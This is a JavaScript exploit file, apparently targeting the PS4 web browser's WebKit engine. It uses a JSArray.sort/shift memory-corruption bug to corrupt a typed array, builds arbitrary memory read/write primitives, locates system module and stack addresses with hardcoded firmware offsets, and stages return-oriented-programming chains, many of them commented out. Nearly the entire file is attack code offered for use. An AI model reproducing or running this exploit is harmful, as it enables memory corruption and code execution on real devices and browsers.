// module bases for gadgets

var WKP = 0;
var LIBKERNEL = 1;
var LIBC = 2;
var LIBSYSMODULE = 3;
var SCENET = 4;
var SCENETCTL = 5;
var SCEIPMI = 6;
var SCEMBUS = 7;
var SCEREGMGR = 8;
var SCERTC = 9;
var SCEPAD = 10;
var SCEVIDEOOUT = 11;
var SCEPIGLET = 12;
var SCEORBISCOMPAT = 13;
var WEBKIT2 = 14;
var SCESYSCORE = 15;
var SCESSL = 16;
var SCEVIDEOCORESERVICE = 17;
var SCESYSTEMSERVICE = 18;
var SCECOMPOSITEEXT = 19;

var errno = [
	"OK",
	"Operation not permitted",
	"No such file or directory",
	"No such process",
	"Interrupted system call",
	"I/O error",
	"No such device or address",
	"Argument list too long",
	"Exec format error",
	"Bad file number",
	"No child processes",
	"Try again",
	"Out of memory",
	"Permission denied",
	"Bad address",
	"Block device required",
	"Device or resource busy",
	"File exists",
	"Cross-device link",
	"No such device",
	"Not a directory",
	"Is a directory",
	"Invalid argument",
	"File table overflow",
	"Too many open files",
	"Not a typewriter",
	"Text file busy",
	"File too large",
	"No space left on device",
	"Illegal seek",
	"Read-only file system",
	"Too many links",
	"Broken pipe",
	"Math argument out of domain of func",
	"Math result not representable"
];

// global vars
var _gc, _cnt = 0;



function exploit() {
	try {

	//
	// Part 1: getting the Uint32Array object address
	//
		// init vars
		window.u32 = new Uint32Array(0x100);
		var a1 = [0,1,2,3,u32];
		var a2 = [0,1,2,3,4]; // right after a1
		var a1len = a1.length;
		var a2len = a2.length;
		var u32len = u32.length;

		// protect local vars from GC // for gdb
		if (!_gc) _gc = new Array();
		_gc.push(u32,a1,a2);

		// declare custom compare function
		var myCompFunc = function(x, y) {
			// check for the last call for last two array items
			if(y == 3 && x == u32) {
				//logAdd("myCompFunc(u32,3)");
				// shift() is calling during sort(), what causes the
				// last array item is written outside the array buffer
				a1.shift();
			}
			return 0;
		}

		// call the vulnerable method - JSArray.sort(...)
		a1.sort(myCompFunc);

		// check results: a2.length should be overwritten by a1[4]
		var len = a2.length;
		//logAdd("a2.length = 0x" + len.toString(16));
		if (len == a2len) { logAdd("error: 1"); return 1; }

	//
	// Part 2: creating corrupted JSValue which points to the (u32+0x18) address
	//

		// modify our compare function
		myCompFunc = function(x,y) {
			if (y == 0 && x == 1) {
				//logAdd("myCompFunc(1,0)");
				// call shift() again to read the corrupted JSValue from a2.length
				// into a1[3] on the next sort loop
				a1.length = a1len;
				a1.shift();
				// modify JSValue
				a2.length = len + 0x18;
			}
			if (y == 3) {
				//logAdd("myCompFunc(x,3)");
				// shift it back to access a1[3]
				a1.unshift(0);
			}
			return 0;
		}

		a1.sort(myCompFunc);

		// now a1[3] should contain the corrupted JSValue from a2.length (=len+0x18)
		var c = a2.length;
		//logAdd("a2.length = 0x" + c.toString(16));
		if (c != len + 0x18) { logAdd("error: 2"); a1[3] = 0; return 2; }

	//
	// Part 3: overwriting ((JSUint32Array)u32).m_impl pointer (see JSCTypedArrayStubs.h)
	//

		// generate dummy JS functions
		var f, f2, f2offs, f2old, funcs = new Array(30);
		c = funcs.length;
		for(var i=0; i < c; i++){
			f = new Function("arg", " return 876543210 + " + (_cnt++) + ";");
			f.prop2 = 0x12345600 + i;
			funcs[i] = f;
		}

		// generate JIT-code
		for(var i=c-1; i >= 0; i--) { funcs[i](i); }

		// prepare objects for the third sort() call
		var mo = {};
		var pd = { set: funcs[0], enumerable:true, configurable:true }
		var a3 = [0,1,2,a1[3]];

		// allocate mo's property storage right after a3's buffer
		Object.defineProperty(mo, "prop0", pd);
		for(var i=1; i < 5; i++){
			mo["prop"+i] = i;
		}

		// protect from GC
		_gc.push(a3,mo,funcs);

		// use sort-n-shift technique again
		myCompFunc = function(x,y)
		{
			// check for the last call for two last array items
			if (y == 2) {
				//logAdd("myCompFunc(a3[3],2)");
				// a3[3] will be written over the mo.prop0 object
				a3.shift();
			}
			return 0;
		}

		// overwrite mo.prop0 by a3[3] = a1[3] = &u32+0x18
		a3.sort(myCompFunc);

		// u32.prop1 has 0x20 offset inside u32, and 0x08 inside mo.prop0 GetterSetter object.
		// we should put some valid pointers into GetterSetter
		u32.prop1 = u32;	// GetterSetter.m_structure
		u32.prop2 = 8;		// 8 = JSType.GetterSetterType
		u32.prop1 = a1[3];	// bypass JSCell::isGetterSetter()

		// clear corrupted JSValue
		a1[3] = 0; a3[3] = 0;

		// overwrite u32.m_impl by some JSFunction object
		f = funcs[c-5];
		pd.set = f;
		Object.defineProperty(mo, "prop0", pd);

		// check results: u32.length is taken from f's internals now
		//logAdd("u32.length = 0x" + u32.length.toString(16));
		if (u32.length == u32len) { logAdd("error: 3"); return 3; }

	//
	//	Part 4: getting the JIT-code memory address
	//

		// declare aux functions
		var setU64 = function(offs, val) {
			u32[offs]	= val % 0x100000000;
			u32[offs+1] = val / 0x100000000;
		}
		var setU32 = function(offs, val) {
			u32[offs] = val;
		}
		var setU16 = function(offs, val) {
			setU8(offs, val % 256);
			setU8(offs + 1, val / 256);
		}
		var setU8 = function(offs, val) {
			u32[offs >>> 2] = (u32[offs >>> 2] & ~(0xFF << ((offs % 4) * 8))) | (val << ((offs % 4) * 8));
		}
		
		var getU64 = function(offs) {
			return u32[offs] + u32[offs+1] * 0x100000000;
		}
		var getU32 = function(offs) {
			return u32[offs];
		}
		var getU8 = function(offs) {
			return (u32[offs >>> 2] >> ((offs % 4) * 8)) & 0xff;
		}
		var getObjAddr = function(obj) {
			// write obj into u32 data
			pd.set.prop2 = obj;
			// read obj address from u32
			return getU64(2);
		}
		
		window.va2ea = function(addr) {
			return addr - u32base;
		}
		window.va2o = function(addr) {
			return va2ea(addr) >>> 2;
		}
		
		// will not modify u32base
		
		window.read32 = function(addr) {
			return u32[va2o(addr)];
		}
		window.write32 = function(addr, val) {
			u32[va2o(addr)] = val & 0xffffffff;
		}
		window.read64 = function(addr) {
			return getU64(va2o(addr));
		}
		window.write64 = function(addr, val) {
			return setU64(va2o(addr), val);
		}

		window.readString = function(addr) {
			var s = '';
			var ea = va2ea(addr);
			var i = ea / 4;
			var j = ea % 4;
			while (1) {
				var c =	 (u32[i] >>> (8 * j)) & 0xff;
				if (c == 0) return s;
				s += String.fromCharCode(c);
				j = (j + 1) % 4;
				if (j == 0) { i += 1; }
			}
			return s;
		}

		window.writeString = function(addr, val) {
			var ea = va2ea(addr);
			var i = ea / 4;
			var j = ea % 4;
			for (var x = 0; x <= val.length; x++) {
				var c = (x == val.length) ? 0 : val.charCodeAt(x);
				var w = u32[i];
				w = (w & ~(0xff << (8 * j))) | (c << (8 * j));
				u32[i] = w;
				j = (j + 1) % 4;
				if (j == 0) { i += 1; }
			}
			return addr + val.length;
		}

		window.int2hex = function(value, digits) {
			value = value.toString(16);
			while (value.length < digits) {
				value = "0" + value;
			}
			
			return value;
		}

		window.hexDump = function(addr, length) {
			var b = '<p><tt>';
			var tmp = '';
			var ea = va2ea(addr);
			var i = ea / 4;
			var j = ea % 4;
			
			b += int2hex(addr, 8);
			b += ": ";
						
			for (z = 1; z <= length; z++) { 
				var ch = (u32[i] >>> (8 * j)) & 0xff;
				b += int2hex(ch, 2);
				if(( ch > 31) && (ch <	127)){
					tmp += String.fromCharCode(ch);
				}
				else {
					tmp += "."
				}
				
				j = (j + 1) % 4;
				if (j == 0) { i += 1; }

				
				//if(z % 4 == 0) {
					b += " ";
				//}
				
				//if(z % 8 == 0) {
				//	b += " ";
				//}
				
				if(z % 16 == 0) {
					b += " | " + tmp + "<br>";
					tmp = "";
					if (z != length) {
						b += int2hex(addr+z, 8) + ": ";
					}
				}	 
			}
			return b + "</p></tt>" 
		}
		
		// size multiples of 8 only
		window.zeroMemory = function(base, size) {
			for(var i = base; i < base + size; i += 8) {
				setU64to(i, 0);
			}
		}
		
		// convert base to base
		window.baseToBase = function(fromBase, toBase, value) {
			if(value == "") value = 0;
			value = parseInt(value, fromBase);
			return Number(value).toString(toBase).toUpperCase();	
		}
		
		// hex escape bytes
		window.escapeToHex = function(str) {
			var hex = '';
			for(var i = 0; i < str.length; i += 2) {
				hex += '\\x' + str[i] + str[i + 1];
			}
			
			//have to eval so JavasSript processes the string for appending
			return eval("ret = \"" + hex + "\"");
		}
		
		// get the memory address of u32
		var u32addr = getObjAddr(u32);
		logAdd("u32 address = 0x" + u32addr.toString(16));
		// get the memory address of u32[0] (ArrayBufferView.m_baseAddress)
		var u32base = getObjAddr(pd.set) + 0x20;
		var u32base0 = u32base;
		logAdd("u32 base = 0x" + u32base.toString(16));

		// on x64 platforms we can't just set u32.length to the huge number
		// for ability to access arbitrary addresses. We should be able to
		// modify the u32's buffer pointer on-the-fly.
		window.setBase = function(addr){
			if (!f2) {
				// search for another JSFunction near "f"
				for(var i=0x12; i < 0x80; i+=0x10){
					if ((u32[i] >>> 8) == 0x123456) {
						f2 = funcs[u32[i] & 0xFF];
						f2offs = i - 6;
						f2old = getU64(f2offs);
						break;
					}
				}
				logAdd("f2offs = 0x" + f2offs);
				if (!f2) { return false; }

			}
			if (pd.set != f) {
				pd.set = f;
				Object.defineProperty(mo, "prop0", pd);
				u32base = u32base0;
			}
			if (addr == null) return true;

			// this will be the new value for ((ArrayBufferView)u32).m_baseAddress
			setU64(f2offs, addr);

			// overwrite ((JSUint32Array)u32).m_impl again
			pd.set = f2;
			Object.defineProperty(mo, "prop0", pd);

			u32base = addr;
			logAdd("u32 new base = 0x" + u32base.toString(16));

			return true;
		}

	// read/write the 64-bit value from the custom address
		window.getU64from = function(addr) {
			if (addr < u32base || addr >= u32base + u32len*4) {
				if (!setBase(addr)) return 0;
			}
			return getU64((addr - u32base) >>> 2);
		}
		
		window.getU32from = function(addr) {
			if (addr < u32base || addr >= u32base + u32len*4) {
				if (!setBase(addr)) return 0;
			}
			return getU32((addr - u32base) >>> 2);
		}
		
		window.getU8from = function(addr) {
			if (addr < u32base || addr >= u32base + u32len*4) {
				if (!setBase(addr)) return 0;
			}
			return getU8(addr - u32base);
		}
		
		window.setU64to = function(addr,val) {
			if (addr < u32base || addr >= u32base + u32len*4) {
				if (!setBase(addr)) return 0;
			}
			return setU64((addr - u32base) >>> 2, val);
		}
		window.setU32to = function(addr,val) {
			if (addr < u32base || addr >= u32base + u32len*4) {
				if (!setBase(addr)) return 0;
			}
			return setU32((addr - u32base) >>> 2, val);
		}
		window.setU16to = function(addr,val) {
			if (addr < u32base || addr >= u32base + u32len*4) {
				if (!setBase(addr)) return 0;
			}
			return setU16((addr - u32base), val);
		}
		window.setU8to = function(addr,val) {
			if (addr < u32base || addr >= u32base + u32len*4) {
				if (!setBase(addr)) return 0;
			}
			return setU8((addr - u32base), val);
		}
		window.setU64into = function(addr, value) {
			var low = value %0x100000000;
			var high = value/0x100000000;
			setBase(addr)
			u32[0] = parseInt(low.toString(16),16);
			u32[1] = parseInt(high.toString(16),16);
		}
		window.setU32into = function(addr, value) {
			setBase(addr);
			u32[0] = value;
		}

	

		//logAdd("u32 size: 0x" + u32.length.toString(16));

		// Get the object table from the origianl heap address
		// +0x20 is a pointer we can use for some object

		logAdd("heap address is: 0x" + u32base0.toString(16));
		//setBase(u32base0);
		//logAdd(hexDump(u32base0+0x3f000,0xa000));
		var xx = getU64from(u32base0+0x20);
		var yy=0;
		
		
	
		//logAdd("verify base: 0x"+xx.toString(16) );

		//
		// This is the only part you need to modify
		//
		//
		//
		// First, the heap array has a pointer into a function
		// in WebKit2. The one I'm using is always at +0x20 from
		// the original base at +0x20.

		// 1.70 PS4 = -0x30bf0 is the start of webkit

		// +0x25C4000 = some data
		// +0x2414000 = import table
		// (import table +0x20) =  modules table
		// If this crashes, try it 2-4 more times. It usually will work

		var chain_addr = u32base0 + 0x80000;
		var chain_data = u32base0 + 0x88000;
		
		/*
		setBase(chain_addr);
		logAdd(hexDump(chain_addr, 0xa000));

        // pointer to object
        var loc0 = getU64from(u32base0 + 0x20);
       // setBase(loc0);
        //logAdd(hexDump(loc0, 32));
        // function pointer in WebKit2 text segment
        var loc1 = getU64from(loc0 + 0x20);
        //setBase(loc1);
        //logAdd(hexDump(loc1, 32));

        // hardcoded offset. technically could scan back for __stubs pattern
        var wk2_text_base = loc1 - 0x30430; // 1.01
        //var wk2_text_base = loc1 - 0x31030;
       // setBase(wk2_text_base);
		
   //     logAdd("wk2_text_base");
        //logAdd(hexDump(wk2_text_base, 0x1A03));
        //logAdd(hexDump(wk2_text_base, 100000));
       // logAdd(hexDump(wk2_text_base + 0x1B70 - 0x20, 1024));
 
        var wk2_import_base = wk2_text_base + 0x2438000;
       // setBase(wk2_import_base);
        //logAdd("wk2_import_base");
        //logAdd(hexDump(wk2_import_base, 0x8000));

        // __stack_chk_guard is imported from libkernel, get the ptr to it
        var __stack_chk_guard_ptr = getU64from(wk2_import_base + 0x20);
		//setBase(__stack_chk_guard_ptr);
       // logAdd(hexDump(__stack_chk_guard_ptr - 0x1000, 0x8000));

		
        var __stack_chk_guard = getU64from(__stack_chk_guard_ptr);
        // hardcoded offset to first entry (note: not the list head)
        var module_list = __stack_chk_guard_ptr - 0x1C290;

		
		
        var modinfo_ptr = module_list;
        var module_infos = {};
		
		//setBase(module_list);
		logAdd("module list is at 0x" +  module_list.toString(16));
		*/
        //logAdd(hexDump(module_list, 0x100));


		//xx = getU64from(xx+0x20); // Get to the module table
		// Future use: data area somewhere around 0x200500000

		//logAdd("Dump Address is 0x" + xx.toString(16));

		//module_list = xx;
        //var modinfo_ptr = module_list;
        //var module_infos = {};
        
        //logAdd("Base: " + hexDump(xx+i_size + 0x158, 4));
		//logAdd("Size: " + hexDump(xx+i_size+0x160, 4));
		//logAdd("Base: " + hexDump(xx+i_size + 0x168, 4));
		//logAdd("Size: " + hexDump(xx+i_size+0x170, 4));

		
		//xx = import_base; // Get to the import table
		//setBase(xx);

		//xx = getU64from(xx+0x20); // Get to the module table
		// Future use: data area somewhere around 0x200500000

		//get libSceLibcinternal base
		//var libc_int_base = getU64from(xx+0x1628); //1.76
		
		//logAdd("Dump Address is 0x" + xx.toString(16));
		
		//var module_list = xx + 0xae0 + 0x690;
		
		// module list is a doubly linked list, where the last node has self->next == 0
		// and the first node has self->prev == prev->next && self->prev->prev == last
		// The list head is seperate from the list and is a kind of "fake" node
		
		var modinfo_ptr = 0x8000039AAB; //module info in libkernel
		module_infos = {};
		var n = 0;
		
		//logAdd("module_list is: 0x" + module_list.toString(16));
		
		
 
       while (modinfo_ptr != 0) {
			var name = readString(modinfo_ptr + 0x18);
			if (name == '') { break; }
			var rdata_base	= read64(modinfo_ptr + 0x170);
			var rdata_size	= read32(modinfo_ptr + 0x178);
			var import_base = read64(modinfo_ptr + 0x180);
			var import_size = read32(modinfo_ptr + 0x188);
			if (rdata_base	== 0 ||
				rdata_size	== 0 ||
				import_base == 0 ||
				import_size == 0) {
				logAdd('jit kicked in? skipping...');
			} else {
				module_infos[n] = {
					name : name,
					image_base : rdata_base,
					image_size : rdata_size + import_size,
					image_end : rdata_base + rdata_size + import_size,
					text_start : rdata_base,
					text_size : rdata_size,
					text_end : rdata_base + rdata_size,
					idata_start : import_base,
					idata_size : import_size,
					idata_end : import_base + import_size,
				};
			}
			// somehow adding the constant instead of reading the value
			// tends to avoid the jit problem
			//modinfo_ptr = read64(modinfo_ptr + 0);
			modinfo_ptr += 0x1c0;
			n++;
		}

			// Defining modules
		wkp = module_infos[WKP];

		libkernel = module_infos[LIBKERNEL];
		libSceLibcInternal = module_infos[LIBC];
		libSceSysmodule = module_infos[LIBSYSMODULE];	
		libSceNet = module_infos[SCENET];	
		libSceNetCtl = module_infos[SCENETCTL];
		libSceIpmi = module_infos[SCEIPMI];
		libSceMbus = module_infos[SCEMBUS];
		libSceRegMgr = module_infos[SCEREGMGR];
		libSceRtc = module_infos[SCERTC];	
		libScePad = module_infos[SCEPAD];	
		libSceVideoOut = module_infos[SCEVIDEOOUT];
		libScePigletv2VSH = module_infos[SCEPIGLET];
		libSceOrbisCompat = module_infos[SCEORBISCOMPAT];
		libSceWebKit2 = module_infos[WEBKIT2];
		libSceSysCore = module_infos[SCESYSCORE];
		libSceSsl = module_infos[SCESSL];
		libSceVideoCoreServerInterface = module_infos[SCEVIDEOCORESERVICE];
		libSceSystemService = module_infos[SCESYSTEMSERVICE];
		libSceCompositeExt = module_infos[SCECOMPOSITEEXT];
		

		//var libsysmodule_base = getU64from(xx+0x17E8);

		//get libkernel base
		xx = 0x800000000; 
		//xx = getU64from(xx+0x1468); //1.76
		//var libkernel_base = xx;
		
		//setBase(xx);
		
		//get stack base
		//xx = getU64from(xx+0x1D890); //1.76 webkit2 stack?
		//xx = getU64from(xx+0xB278); //1.76 webprocess stack
		//yy = getU64from(xx+0x5AA70); //1.71
		//xx = xx + 0x56800; //1.01 webprocess stack

		xx = getU64from(xx+0x56800); //1.01 webprocess stack pointer

		window.stack_base = xx - 0x4090;
		logAdd("stack is at : 0x" + stack_base.toString(16));
		
		//setBase(stack_base);
		//logAdd(hexDump(stack_base, 0x300));
	
		//yy = getU64from(xx+0x5AA70);
		
		
	
		

		//var sb;

				//logAdd('wkp: '+wkp.image_base.toString(16)+' '+wkp.image_end.toString(16));
		//xx = getU64from(libkernel.image_base+0x567b8); //webprocess stack
//		xx = libkernel.image_base+0x5B278-0x210000; //webprocess stack
		//xx = libkernel.image_base+0x4D890; //webprocess stack


		// 0x7ef2fc000 - 1.76 stack base?
		//0x7ef418000
		//		window.stack_base = xx & ~0xFF - 0x4090;
		// 0x7efe00010

		//logAdd("offset of webprocces stack is: 0x" + (sb).toString(16));


		//setBase(sb);
		//logAdd(hexDump(sb-0x4000, 0x4000));
		
		
		/*
		module bases 1.01
	0	wkp =                  0x400000
	1	libkernel =         0x800000000
	2	internal C =        0x800058000
	3	libSceSysmodule =   0x800148000
	4	libSceNet =         0x800154000
	5	libSceNetCtl =      0x800180000
	6	libSceIpmi = 	    0x800190000
	7	libSceMbus = 	    0x8001b4000
	8	libSceRegMgr = 	    0x8001c4000
	9	libSceRtc  = 	    0x8001d0000
	10	libScePad =         0x8001dc000
	11	libSceVideoOut =    0x8001ec000
	12	libScePigletv2VSH = 0x800200000
	13	libSceOrbisCompat = 0x800294000
	14	libSceWebKit2	=   0x80046c000
	

	bases are 0x4000 forward on 1.05 for modules after libkernel, suggesting libkernel is larger or there is 0x4000 extra between libkernel and lib c internals
	
		*/
		
		//780080000
		
		//xx = getU64from(libSceWebKit2.image_base + 0x2438830);
		//xx = u32base0 + 0x8000000; // 0x800468000
		  // xx = libkernel.image_base - 0x780080000 -0x800;
		  // xx = 0x7ff80000 + 0x8000;
		
		//xx = getU64from(xx);
		//sb = xx & ~0xFF;
		
//setBase(sb);
		//setBase(xx);

		/*
		var stkbs = libkernel.image_base - 0x7ff61a00;
		logAdd("stack base is: 0x" + stkbs.toString(16));
		logAdd("libkernel base is: 0x" + libkernel.image_base.toString(16));
		var stbs = libkernel.image_base - stkbs - 0x800;
		*/
		//setBase(stbs);
	//logAdd(hexDump(stbs , 0x80));
		
		
		//7FF61A00
		
	//var stackbust = [0xda, 0xda, 0xba, 0xda, 0xba, 0xfa, 0xad, 0xca];
	
	//logAdd(hexDump(xx , 0x80));
	
/*
		
		var l = 0;
		function runSearch(l){
			asdf = hexDump(u32base0+l, 0xa000);

			//F3 5C C3
			if (asdf.indexOf(0xaaaa) != -1) {
				logAdd("FOUND IT!!!!");
				setBase(asdf);
				logAdd(asdf);
			}
	}

	runSearch(l +0x10000000);
*/


/*
		
		//window.stack_base = xx;
var bs;
		for(var l = 0; l < 0xa000; l =  l +0x8){
			//logAdd(hexDump(xx + l, 0x8));
			xx = xx + l;
			bs = getU64from(xx);
			setBase(bs);
			//logAdd("0x"+getU64from(xx));
		}
*/
		
		//xx = getU64from(0x800039a20);
		
		//xx = getU64from(module_list -0x38);
		//xx = module_list -0x38;
		//xx = xx -0x7FFFBADA0;
		//setBase(xx);
		//logAdd(hexDump(xx, 0xa000));
		
		

		
		
		
		
		
		
		
		
		/*
		asdf = hexDump(libSceWebKit2.image_base +0x101072, 0xa000);
//EB FE
if (asdf.indexOf("ebfe") != -1) {
	logAdd("FOUND IT!!!!");
	logAdd(asdf);
}
		*/
		
		
		
		
		//var stack_base = libSceWebKit2.image_base - 0x20000;
	//	setBase(stack_base);

	//	var __stack_chk_fail_ptr = getU64from(module_infos[WEBKIT2].image_base + 0xd8);
		//var __stack_chk_fail_ptr = module_infos[WEBKIT2].image_base + 0x110;
		//logAdd(hexDump(stack_base, 0x5000)); 


		//setBase(__stack_chk_fail_ptr);
		//logAdd("offset of stack_chk_guard is: 0x" + __stack_chk_fail_ptr.toString(16));
		
		//window.stack_base = xx;

		//sb = __stack_chk_fail_ptr & ~0xFF;

		//xx = libkernel.image_base-0x100FFFF0;
		//setBase(xx);
		
		//logAdd("offset of stack_base is: 0x" + sb.toString(16));

		//setBase(stack_base);
		
		//logAdd(hexDump(xx, 0x800));

		
		
		
		
		
		
//	  var js_core_base_addr = new dcodeIO.Long(u32[0x10], u32[0x11], true).sub(0x4192c50);
 // var webkitgtk_base_addr = js_core_base_addr.add(0x2290000);
  //var libc_base_addr = js_core_base_addr.add(0x980000);
  //var stack_base = js_core_base_addr.add(0xc522000);
	
	//setBase(libc_base_addr);
	//logAdd("stack base is: 0x" + libc_base_addr.toString(16));
	//logAdd(hexDump(libc_base_addr, 0x80));

	
		//logAdd("peek stack is : " + peek_val.toString(16));
			
	//	window.stack_base = getU64from(module_infos[LIBKERNEL].image_base + 0x580c8);
		//window.stack_base = module_infos[LIBC].image_base + 0x5ad5;

		//stack_base = 0x0000000000041f0f;
		//setBase(stack_base);
		//logAdd(hexDump(stack_base, 0x8000));

		//window.stack_base = module_infos[LIBKERNEL].image_base + 0x8000;

		//logAdd("Stack Base = 0x" + stack_base.toString(16));
	//	setBase(stack_base);
        //logAdd(hexDump(stack_base, 0x8000));
		
		//xx = libkernel.image_base;
		//setBase(xx);
		
		
		
		
		
		
		// Get base address of u32(ArrayBufferView.m_baseAddress)
       // var u32base = u32[0x40000000-2];
    //   var u32base = u32base0;
       // logAdd("Address of u32: 0x" + u32addr.toString(16))
       // logAdd("Base of u32: 0x" + u32base.toString(16))
	//var test = 0x56000;
	//setBase(test);
	//u32base0 = getU64from(u32base0);
	//setBase(u32base0);
	
	//0x91271eea0
		//logAdd(hexDump(u32base0+0x450000, 0xa000));
		//var aas;
		//setBase(aas);
		//setU64to(wkp.image_base, aas);

		
		
		
		
		
		
				//window.stack_base = libkernel.image_base + 0x11267FFFF;//0x91267ffff;
									// 0x800000000
		
				//xx = getU64from(module_list -0x38);
				//window.stack_base = libkernel.image_base - 0x50a0;
				//window.stack_base = 56800;
				
				//0x200211000 - 0xf0000
				//0x9129a0000
				
				// 0x880000000 heap?
				//A378
				//window.return_va = 0x2b38; //1.76
			window.return_va = 0x2c48; // 1.01 - pointer to same function used on 1.76 orbis compat
			//window.return_va = 0x2AA0;

			logAdd("return is : 0x" + getU64from(stack_base + return_va).toString(16));








		//window.stack_base = stack_base;
				
				//var red = stack_base - 0x20000;
				//setBase(red);
				//logAdd("red is : 0x" + red.toString(16));
				//setBase(red);
				
				
				//red = 0x880050bc6;
				//setBase(stack_base);
				/*for (d = 0; d < 0x2000; d = d + 0x8){
				
					var k = getU64from(stack_base + d);
					logAdd("0x"+ k.toString(16));
				
				
				}*/
				//logAdd(hexDump(stack_base,0xa000));
				//var stack;
				//var d;
				//var st = getU64from(stack_base + return_va);
				/*for(d = 0; d < 0x1000; d = d + 0x8){
					setBase(stack_base + d);
					setU64to(stack_base + d, st);
					
				}*/
				//setBase(stack_base);
				//logAdd(hexDump(stack_base,0xa000));
			
				
				//logAdd(hexDump(red - 0x3000 + 0x49ba0,0xa000));

				
							//	logAdd(hexDump(red ,0x100));

				
				//0x7FFFFC000
				//var d = 0x1bad07d8d48;
			
				
				//setBase(d);
				//logAdd("stack base is : 0x"+stack_base.toString(16));
				//var k = 0x7FFD94000;
				//setBase(k);
				//logAdd("return va is : 0x"+ return_va.toString(16));
				//logAdd(hexDump(k, 0xa0));
			
			
			
			
			
			
			

			
			
			
			
			
			
			
			
			
			


	
	
				// ***************** ROP START *********************

// store data
// store ROP chain
/*
logAdd("syscall " + "getpid");
var systemCallNumber = 20;
this.add("pop rax", systemCallNumber);
this.add("mov r10, rcx; syscall");

setU64to(chain_addr + 0x0, libSceWebKit2.image_base + 0x32d7d);
*/

//setU64to(chain_addr + 0, 0x18E01);

//setBase(chain_addr);
//logAdd(hexDump(chain_addr, 128));

// point a return address of the stack to our chain
//setU64to(stack_base + return_va - 0, chain_addr);
//logAdd(hexDump(stack_base + return_va,0xa0));
//setU64to(stack_base + return_va, module_infos[WEBKIT2].image_base + 392117);
//389445
/*
setU64to(stack_base + return_va + 8, chain_addr);
setU64to(stack_base + return_va, module_infos[WEBKIT2].image_base + 389445);

var wkb = module_infos[WEBKIT2].image_base;
logAdd(hexDump(wkb, 1024));

// store data
// store ROP chain
setU64to(chain_addr + 0, module_infos[LIBC].image_base + 173238);
logAdd(hexDump(module_infos[LIBC].image_base + 173240, 16));
logAdd(getU32from(module_infos[LIBC].image_base + 173238).toString(16));
logAdd(getU32from(module_infos[LIBC].image_base + 0x0004d152).toString(16));
//173239
// point a return address of the stack to our chain
setU64to(stack_base + return_va + 8, chain_addr);
setU64to(stack_base + return_va, module_infos[LIBC].image_base + 0x0004d152);

		// ***************** ROP END ***********************
		*/
		
		
		
		
		
		
		
		//dump(xx, 1, 0x200);

		logAdd("Refresh this page between calls to avoid instability and crashes. Enjoy...");
		
		
	}
	
	catch(e) {
		logAdd(e);
	}

	return 0;
}
